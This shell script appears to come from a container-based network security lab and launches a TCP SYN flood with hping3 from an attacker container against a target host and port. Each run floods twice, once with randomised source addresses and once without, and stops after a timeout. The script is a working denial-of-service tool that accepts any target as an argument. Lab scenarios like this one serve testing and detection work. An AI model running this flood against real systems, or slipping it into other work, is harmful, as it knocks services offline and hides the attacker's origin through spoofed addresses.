#!/bin/sh

set -e

# ./dos_syn_flood_hping3.sh clab-virtual-env-attacker
# ./dos_syn_flood_hping3.sh clab-virtual-env-attacker 172.16.30.2 80 60

# If called with -n, return the menu name
if [ "$1" = "-n" ]; then
    echo "DoS TCP SYN flood | hping3"
    exit 0
fi

# Ensure the name of the container is specified
if [ -z "$1" ]; then
    echo "Usage: $0 <attacker-container> [target] [port] [timeout]"
    exit 1
fi

ATTACKER_CONTAINER="$1"
TARGET="${2:-enterprise.com}"             # Default target URL
PORT="${3:-80}"                           # Default to port 80
TIMEOUT="${4:-60}"                        # Default to 60 seconds

# https://www.kali.org/tools/hping3/
echo "================================"
echo "Attack: DoS TCP SYN flood (hping3)"
echo "Target: $TARGET"
echo "Port: $PORT"
echo "Timeout: ${TIMEOUT}s"
echo "Attacker container: $ATTACKER_CONTAINER"
echo "================================"

# -S              -> SYN flag
# -p              -> Target port
# --flood         -> Send packets as fast as possible
# --rand-source   -> Randomize source IP
# --tcp-timestamp -> Set timestamp on packages
# -V              -> Verbose

# Recommended to kill the process using its PID and not through a timeout,
# so the parent shell stays alive to reap the child and avoid zombie processes
echo "--- Random Source ---"
docker exec "$ATTACKER_CONTAINER" sh -c "
  hping3 -S -p $PORT --flood --rand-source --tcp-timestamp $TARGET &
  HPING_RND_PID=\$!
  sleep $TIMEOUT
  kill -2 \$HPING_RND_PID
  wait \$HPING_RND_PID 2>/dev/null || true
"

echo "--- Same Source ---"
docker exec "$ATTACKER_CONTAINER" sh -c "
  hping3 -S -p $PORT --flood --tcp-timestamp $TARGET &
  HPING_STC_PID=\$!
  sleep $TIMEOUT
  kill -2 \$HPING_STC_PID
  wait \$HPING_STC_PID 2>/dev/null || true
"
